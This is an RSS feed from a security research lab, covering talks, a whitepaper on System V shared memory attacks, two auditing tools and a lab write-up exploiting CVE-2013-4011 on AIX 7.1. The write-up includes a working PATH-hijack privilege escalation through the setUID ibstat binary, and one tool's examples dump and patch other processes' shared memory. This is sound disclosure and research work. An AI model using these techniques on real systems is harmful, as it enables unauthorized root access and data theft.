<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Portcullis Labs &#187; imisslsd</title>
	<atom:link href="https://labs.portcullis.co.uk/tag/imisslsd/feed/" rel="self" type="application/rss+xml" />
	<link>https://labs.portcullis.co.uk</link>
	<description>Research and Development</description>
	<language>en-US</language>
		<sy:updatePeriod>hourly</sy:updatePeriod>
		<sy:updateFrequency>1</sy:updateFrequency>
	<generator>http://wordpress.org/?v=3.8.5</generator>
	<item>
		<title>44CON uncovered</title>
		<link>https://labs.portcullis.co.uk/presentations/44con-uncovered/</link>
		<comments>https://labs.portcullis.co.uk/presentations/44con-uncovered/#comments</comments>
		<pubDate>Sat, 21 Jun 2014 12:01:45 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[44CON]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[SnoopCon]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=4567</guid>
		<description><![CDATA[<p>Presentation on system level vulnerabilities (as given at BT&#8217;s SnoopCon 2014). This talk references previous presentations including: &#8220;I miss LSD&#8220; &#8220;Big Game Hunting: Simple techniques for bug hunting on big iron UNIX&#8220; &#8220;Breaking the Links: Exploiting the Linker&#8220;</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/44con-uncovered/">44CON uncovered</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on system level vulnerabilities (as given at BT&#8217;s SnoopCon 2014).<span id="more-4567"></span></p>
<p>This talk references previous presentations including:</p>
<ul>
<li>&#8220;<a title="I miss LSD" href="/presentations/i-miss-lsd/">I miss LSD</a>&#8220;</li>
<li>&#8220;<a title="Big Game Hunting: Simple techniques for bug hunting on big iron UNIX" href="/presentations/big-game-hunting-simple-techniques-for-bug-hunting-on-big-iron-unix/">Big Game Hunting: Simple techniques for bug hunting on big iron UNIX</a>&#8220;</li>
<li>&#8220;<a title="Breaking the Links: Exploiting the Linker" href="/presentations/breaking-the-links-exploiting-the-linker/">Breaking the Links: Exploiting the Linker</a>&#8220;</li>
</ul>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/44CU.pdf" target="_blank" title="Download 44CU"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="44CU" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/44CU.pdf" title="Download 44CU.pdf" target="_blank" id="wpfb-file-link-1">44CU.pdf</a>
    
    <br />
    June 20, 2014<br />
    
  </div>
  <div class="info">
    247.5 KiB<br />
    MD5 hash: 22527f212e79dffdb8a91c56b878130f <br />
    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>June 20, 2014</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/presentations/44con-uncovered/">44CON uncovered</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/44con-uncovered/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Memory Squatting: Attacks On System V Shared Memory</title>
		<link>https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/</link>
		<comments>https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/#comments</comments>
		<pubDate>Wed, 13 Nov 2013 03:26:00 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Whitepapers]]></category>
		<category><![CDATA[44CON]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2403</guid>
		<description><![CDATA[<p>Rather than representing a definitive guide, this document represents a review of the specific security issues identified during Portcullis Computer Security Ltd’s recent research into System V shared memory segments and their usage. What follows should, however, provide a high-level summary of issues, impacts and methods of remediation in cases where System V shared memory [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">Memory Squatting: Attacks On System V Shared Memory</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Rather than representing a definitive guide, this document represents a review of the specific security issues identified during Portcullis Computer Security Ltd’s recent research into System V shared memory segments and their usage.<span id="more-2403"></span></p>
<p>What follows should, however, provide a high-level summary of issues, impacts and methods of remediation in cases where System V shared memory segments are used in an insecure fashion. This paper was released as part of my presentation at 44CON 2013 entitled &#8220;<a title="I Miss LSD" href="/presentations/i-miss-lsd/">I miss LSD</a>&#8220;.</p>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-2').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/MSAOSVSM.pdf" target="_blank" title="Download MSAOSVSM"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="MSAOSVSM" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/MSAOSVSM.pdf" title="Download MSAOSVSM.pdf" target="_blank" id="wpfb-file-link-2">MSAOSVSM.pdf</a>
    
    <br />
    November 13, 2013<br />
    
  </div>
  <div class="info">
    569.3 KiB<br />
    MD5 hash: 2511c7c09b51f39b74f37ed5e79fe1b5 <br />
    <a href="#" onclick="return wpfilebase_filedetails(2);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails2" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>November 13, 2013</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">Memory Squatting: Attacks On System V Shared Memory</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>smaSHeM</title>
		<link>https://labs.portcullis.co.uk/tools/smashem/</link>
		<comments>https://labs.portcullis.co.uk/tools/smashem/#comments</comments>
		<pubDate>Tue, 12 Nov 2013 22:24:29 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Tools]]></category>
		<category><![CDATA[44CON]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2362</guid>
		<description><![CDATA[<p>smaSHeM is a System V shared memory segment manipulator. Key features Allows dumping of segments in a variety of formats including JPEGs Allows patching of segments Overview System V shared memory segments created with shmget() are assigned an owner, a group and a set of permissions intended to limit access to the segment to designated [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/smashem/">smaSHeM</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>smaSHeM is a System V shared memory segment manipulator.<span id="more-2362"></span></p>
<h2>Key features</h2>
<ul>
<li>Allows dumping of segments in a variety of formats including JPEGs</li>
<li>Allows patching of segments</li>
</ul>
<h2>Overview</h2>
<p>System V shared memory segments created with shmget() are assigned an owner, a group and a set of permissions intended to limit access to the segment to designated processes only. The owner of a shared memory segment can change the ownership and permissions on a segment after its creation using shmctl(). Any subsequent processes that wish to attach to the segment can only do so if they have the appropriate permissions. Once attached, the process can read or write to the segment, as per the permissions that were set when the segment was created.</p>
<p>smaSHeM takes advantage of applications that set weak permissions on such segments, allowing an attacker to dump or patch their contents. As discussed in my presentation at 44CON 2013 entitled &#8220;<a title="I Miss LSD" href="/presentations/i-miss-lsd/">I miss LSD</a>&#8220;, in the case of many X11 applications it is possible to extract pixmaps of previously rendered GUI artifacts. When compiled with QtCore linking enabled, smaSHeM aids in that process by brute forcing potentially valid dimensions for the raw pixmap dump.</p>
<h2>Installation</h2>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ./configure [--with-qtcore] &amp;&amp; make &amp;&amp; make install
</pre>
<h2>Usage</h2>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ smaSHeM -v | -i &lt;shmemid&gt; -l &lt;shmemlength&gt; &lt;-@ &lt;patchoffset&gt; -s &lt;patchstring&gt; | -d [-p | -c | -P | -j -x &lt;xstart&gt; -X &lt;endx&gt; -y &lt;starty&gt; -Y &lt;yend&gt;]&gt;
</pre>
<h2>Examples</h2>
<p>Dumping the contents of a System V shared memory segment prettily:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ smaSHeM -i 94273546 -l 459200 -d -P
0xf32fa000      00 00 00 00 1a 1a 1a 1a ........
0xf32fa008      7d 7d 7d 7d a7 a7 a7 a7 ........
0xf32fa010      af af af af af af af af ........
0xf32fa018      af af af af af af af af ........
0xf32fa020      af af af af af af af af ........
0xf32fa028      af af af af af af af af ........
0xf32fa030      af af af af af af af af ........
0xf32fa038      af af af af af af af af ........
0xf32fa040      af af af af af af af af ........
0xf32fa048      af af af af af af af af ........
0xf32fa050      af af af af af af af af ........
0xf32fa058      af af af af af af af af ........
0xf32fa060      af af af af af af af af ........
0xf32fa068      af af af af af af af af ........
0xf32fa070      af af af af af af af af ........
0xf32fa078      af af af af af af af af ........
...
</pre>
<p>Patching a segment:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ smaSHeM -i 41779331 -l 2640 -@ 0 -s `perl -e 'print &quot;A&quot;x1024'`
</pre>
<p>Dumping the contents of a segment as a set of JPEGs with dimensions 0-300&#215;30 (required QtCore):</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ smaSHeM -i 41779331 -l 2640 -d -J -x 0 -X 300 -y 30 -Y 30
</pre>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-3').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/smaSHeM-0.4.tar.gz" target="_blank" title="Download SmaSHeM-0.4 Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="SmaSHeM-0.4 Tar" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/smaSHeM-0.4.tar.gz" title="Download smaSHeM-0.4.tar.gz" target="_blank" id="wpfb-file-link-3">smaSHeM-0.4.tar.gz</a>
    
    <br />
    November 12, 2013<br />
    
  </div>
  <div class="info">
    210.0 KiB<br />
    MD5 hash: 2e30e4edd2faf5946b6c0e1a244fd0ba <br />
    <a href="#" onclick="return wpfilebase_filedetails(3);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails3" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>November 12, 2013</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/tools/smashem/">smaSHeM</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/tools/smashem/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>I miss LSD</title>
		<link>https://labs.portcullis.co.uk/presentations/i-miss-lsd/</link>
		<comments>https://labs.portcullis.co.uk/presentations/i-miss-lsd/#comments</comments>
		<pubDate>Sun, 15 Sep 2013 00:48:00 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[44CON]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1714</guid>
		<description><![CDATA[<p>Presentation on system level vulnerabilities (as given at 44CON 2013). A wise man once said (paraphrased) &#8220;if you want to find UNIX bugs, compare and contrast the Linux and Solaris man pages&#8221;. Following on from my previous work on linker bugs and more recently AIX (at 44CON 2012), we’ll look at some of the more [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/i-miss-lsd/">I miss LSD</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on system level vulnerabilities (as given at 44CON 2013).<span id="more-1714"></span></p>
<p>A wise man once said (paraphrased) &#8220;if you want to find UNIX bugs, compare and contrast the Linux and Solaris man pages&#8221;. Following on from my previous work on <a title="linker bugs" href="/presentations/breaking-the-links-exploiting-the-linker/">linker bugs</a> and more recently <a title="AIX" href="/presentations/big-game-hunting-simple-techniques-for-bug-hunting-on-big-iron-unix/">AIX</a> (at 44CON 2012), we’ll look at some of the more interesting areas of the POSIX specification, focusing on the various IPC mechanisms that can be found in modern POSIX alike OS as well as kernel land more generally. The talk included some new tools I’ve written (to be published in due course) to aid in this analysis along with some discussion around how I uncovered potentially exploitable bugs in ~400 Debian GNU/Linux packages in a single day.</p>
<p>This talk was based around the recently released whitepaper &#8220;<a title="Memory Squatting: Attacks On System V Shared Memory" href="/whitepapers/memory-squatting-attacks-on-system-v-shared-memory/">Memory Squatting: Attacks On System V Shared Memory</a>&#8220;.</p>
<p>Tools referenced in this talk include:</p>
<ul>
<li><a title="UNIXSocketScanner" href="/tools/unix-socket-scanner/">UNIXSocketScanner</a></li>
<li><a title="smaSHeM" href="/tools/smashem/">smaSHeM</a></li>
</ul>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-4').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/IML44C.pdf" target="_blank" title="Download IML44C"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="IML44C" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/IML44C.pdf" title="Download IML44C.pdf" target="_blank" id="wpfb-file-link-4">IML44C.pdf</a>
    
    <br />
    September 29, 2013<br />
    
  </div>
  <div class="info">
    244.4 KiB<br />
    MD5 hash: 3dbaf8ee9413111d8284f4b1f2dc5aa1 <br />
    <a href="#" onclick="return wpfilebase_filedetails(4);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails4" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>September 29, 2013</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/presentations/i-miss-lsd/">I miss LSD</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/i-miss-lsd/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</title>
		<link>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/</link>
		<comments>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/#comments</comments>
		<pubDate>Sat, 20 Jul 2013 11:01:33 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[AIX]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[CVE-2013-4011]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[root]]></category>

		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1151</guid>
		<description><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting advisory come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Early this morning, whilst checking my mail, I saw an interesting <a title="advisory" href="http://aix.software.ibm.com/aix/efixes/security/infiniband_advisory.asc">advisory</a> come out on one of the lists. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release. Unlike some of the other commercial UNIX vendors, IBM make their security patches nice and accessible, so I decided to take it for a spin.<span id="more-1151"></span></p>
<p>The advisory concerned AIX (one of my favourite operating systems to pwn) and related to a potential privilege escalation vulnerability in AIX 6.1 and AIX 7.1&#8242;s ibstat command which has setUID root permissions set on it. The fact that it affects AIX 7.1 was particularly interesting because this is the most recent release.</p>
<p>It&#8217;s fair to say that there are a substantial number of such vulnerabilities in AIX 7.1 but my interest was peaked because it wasn&#8217;t one that we&#8217;d found.</p>
<p>To start with, I grabbed a copy of the efix and extracted it. You&#8217;ll notice that the tarball referenced within the advisory contains patches for all supported AIX releases which are delivered as compressed epkg files. It might not be immediately clear but these are actually just tarballs with some meta data describing the patched files. So let&#8217;s extract one and take a look:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ tar xvf iv43580m2a.130619.epkg
x ./ecfile, 837 bytes, 2 media blocks.
...
x ./EFILE1, 47516 bytes, 93 media blocks.
x ./EFILE2, 17576 bytes, 35 media blocks.
...
$ cat ecfile
...
EFIX_FILE:
EFIX_FILE_NUM=1
...
TARGET_FILE=/usr/sbin/ibstat
...
EFIX_FILE:
EFIX_FILE_NUM=2
...
TARGET_FILE=/usr/sbin/arp.ib
...
</pre>
<p>I&#8217;ve stripped out the less interesting bits of ecfile but we can clearly see that this patches two files, /usr/sbin/ibstat and /usr/sbin/arp.ib.</p>
<p>So the next question is that have they actually changed? My first thought was to objdump the two binaries and compare the output. This should give us a clear idea of what libc function calls are being utilised (and thus what the vulnerability is likely to be) however they had been stripped of all symbols which would make this a long and tedious process. So what else can we do? Well, knowing what classes of vulnerability AIX commonly falls foul of, I figured there was a reasonable likelihood that the vulnerability pertained to some kind of command injection, so I ran strings across the vulnerable binary to see if it was possible in this case:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ strings /usr/sbin/ibstat
@(#)23 1.5 src/bos/usr/ccs/lib/libpthreads/init.c, libpth, bos53H, h2006_10B1 3/5/06 21:33:24
...
ifconfig %s
...
</pre>
<p>It certainly looked like this was a possibility, however I wanted to be sure. My next step was to run strings across the new binary and compare the output. For this, I used kompare:</p>
<div id="attachment_1152" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-removed-from-the-binary/" rel="attachment wp-att-1152"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/07/missingcommands-300x37.png" alt="Commands that have been removed from the binary" width="300" height="37" class="size-medium wp-image-1152" /></a><p class="wp-caption-text">Commands that have been removed from the binary</p></div>
<div id="attachment_1153" style="width: 310px" class="wp-caption alignnone"><a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/attachment/commands-that-have-been-added-to-the-binary/" rel="attachment wp-att-1153"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/07/replacedcommands-300x45.png" alt="Commands that have been added to the binary" width="300" height="45" class="size-medium wp-image-1153" /></a><p class="wp-caption-text">Commands that have been added to the binary</p></div>
<p>Now we can quite clearly see what has changed. It appears that in the vulnerable binary certain system commands are called, without a fully qualified path. What does this mean? Well, unless the ibstat binary correctly sanitises the PATH environment variable when it is called then binaries such as arp etc will be called by ibstat from the first matching directory specified in PATH.</p>
<p>What this means is that we can provide our own malicious binaries in a location which we control and have them executed as root when we run the ibstat binary (as it has setUID root permissions set).</p>
<p>We can prove this as follows:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ls -l dummybin/
total 8
lrwxrwxrwx 1 user staff 8 Jul 20 09:59 arp -&gt; ifconfig
-rwxr-xr-x 1 user staff 49 Jul 20 10:55 ifconfig
lrwxrwxrwx 1 user staff 8 Jul 20 09:59 lsattr -&gt; ifconfig
$ cat dummybin/ifconfig
#!/bin/sh

echo $0
echo $1
echo $2
id
sleep 1000
$ PATH=/home/user/ibstat/dummybin:/usr/bin:/etc:/usr/sbin:/usr/ucb /usr/sbin/ibstat -a lo0

===============================================================================
IB INTERFACE ARP TABLE
===============================================================================
/home/user/ibstat/dummybin/arp
-t
ib
uid=208(user) gid=1(staff) euid=0(root)
</pre>
<p>And there you have it, euid=0 in under half an hour.</p>
<p>If you enjoyed this write up be sure to get yourself a ticket for <a title="44CON" href="http://shop.44con.com/collections/44con-tickets">44CON</a> where I will be presenting the next round of our more detailed research into modern POSIX alike OS, including how I uncovered potentially exploitable bugs in ~400 Debian GNU/Linux packages in a single day.</p>
<p>The post <a href="https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/">In the lab, popping CVE-2013-4011 for AIX 7.1&#8230;</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/blog/in-the-lab-popping-cve-2013-4011-for-aix-7-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>UNIXSocketScanner</title>
		<link>https://labs.portcullis.co.uk/tools/unix-socket-scanner/</link>
		<comments>https://labs.portcullis.co.uk/tools/unix-socket-scanner/#comments</comments>
		<pubDate>Fri, 26 Apr 2013 18:16:40 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Tools]]></category>
		<category><![CDATA[44CON]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[imisslsd]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">http://wordpress.65535.com/blogtest/?p=173</guid>
		<description><![CDATA[<p>UNIXSocketScanner is a UNIX domain socket scanner. Key features Multi threaded Supports both internal probes format and nmap probes format Overview UNIX domain sockets are &#8220;files&#8221; that follow the semantics of the UNIX socket interface and can be utilised by applications to offer services to other processes that are present on the same host. Whilst [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/unix-socket-scanner/">UNIXSocketScanner</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>UNIXSocketScanner is a UNIX domain socket scanner.<span id="more-173"></span></p>
<h2>Key features</h2>
<ul>
<li>Multi threaded</li>
<li>Supports both internal probes format and nmap probes format</li>
</ul>
<h2>Overview</h2>
<p>UNIX domain sockets are &#8220;files&#8221; that follow the semantics of the UNIX socket interface and can be utilised by applications to offer services to other processes that are present on the same host. Whilst it can often be clear what protocols such services support from the name of the socket and/or the process that created it, this is not always the case especially if the process isn&#8217;t part of a well known F/OSS application.</p>
<p>UNIXSocketScanner allows the UNIX domain sockets offered by a given application to be enumerated using both nmap and internal probes to determine the likely protocol. As discussed in my presentation at 44CON 2013 entitled &#8220;<a title="I Miss LSD" href="/presentations/i-miss-lsd/">I Miss LSD</a>&#8220;, the results are sometimes surprising &#8211; who knew that CUPS offered HTTP over a UNIX domain socket?</p>
<h2>Installation</h2>
<p>UNIXSocketScanner does not require installation but simply requires that the necessary dependencies have been installed.</p>
<h2>Usage</h2>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ find / -type s | UNIXSocketScanner.pl [-v] -x &lt;maximumprocess&gt; &lt;-p &lt;probesfilename&gt; | -n &lt;nmapprobesfilename&gt;&gt;
</pre>
<h2>Examples</h2>
<p>Scanning the CUPS UNIX domain socket:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ echo /var/run/cups/cups.sock | UNIXSocketScanner.pl -x 2 -n /usr/share/nmap/nmap-service-probes
I: /var/run/cups/cups.sock
I: /var/run/cups/cups.sock finished
/var/run/cups/cups.sock
+ matches nmap-response-ssl
+ matches nmap-probe-SSLSessionReq
+ matches nmap-probe-GetRequest
+ matches nmap-response-ipp
+ matches nmap-probe-SSLv23SessionReq
+ matches nmap-probe-HTTPOptions
</pre>
<p>Connecting to the Avahi UNIX domain socket manually with socat:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ socat UNIX:/var/run/cups/cups.sock STDIO
HEAD / HTTP/1.0

HTTP/1.0 200 OK
Date: Tue, 12 Nov 2013 22:50:04 GMT
Server: CUPS/1.5
Content-Language: en_US
Content-Type: text/html; charset=utf-8
Last-Modified: Mon, 18 Mar 2013 14:36:53 GMT
Content-Length: 3796
</pre>
<p>Scanning the Avahi UNIX domain socket:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ echo /var/run/avahi-daemon/socket | UNIXSocketScanner.pl -x 2 -p src/probes
I: /var/run/avahi-daemon/socket
I: /var/run/avahi-daemon/socket finished
/var/run/avahi-daemon/socket
+ matches avahi-fuck
</pre>
<p>Connecting to the Avahi UNIX domain socket manually with socat:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ socat UNIX:/var/run/avahi-daemon/socket STDIO
FUCK
+ FUCK: Go fuck yourself!
</pre>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-5').click();">
  <div class="icon"><a href="https://labs.portcullis.co.uk/download/UNIXSocketScanner-0.4.tar.gz" target="_blank" title="Download UNIXSocketScanner-0.4 Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="UNIXSocketScanner-0.4 Tar" /></a></div>
  <div class="filetitle">
    <a href="https://labs.portcullis.co.uk/download/UNIXSocketScanner-0.4.tar.gz" title="Download UNIXSocketScanner-0.4.tar.gz" target="_blank" id="wpfb-file-link-5">UNIXSocketScanner-0.4.tar.gz</a>
    
    <br />
    April 26, 2013<br />
    
  </div>
  <div class="info">
    5.3 KiB<br />
    MD5 hash: ccf7b78735ca12eb2d7195c1193979ba <br />
    <a href="#" onclick="return wpfilebase_filedetails(5);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails5" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>April 26, 2013</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://labs.portcullis.co.uk/tools/unix-socket-scanner/">UNIXSocketScanner</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://labs.portcullis.co.uk/tools/unix-socket-scanner/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
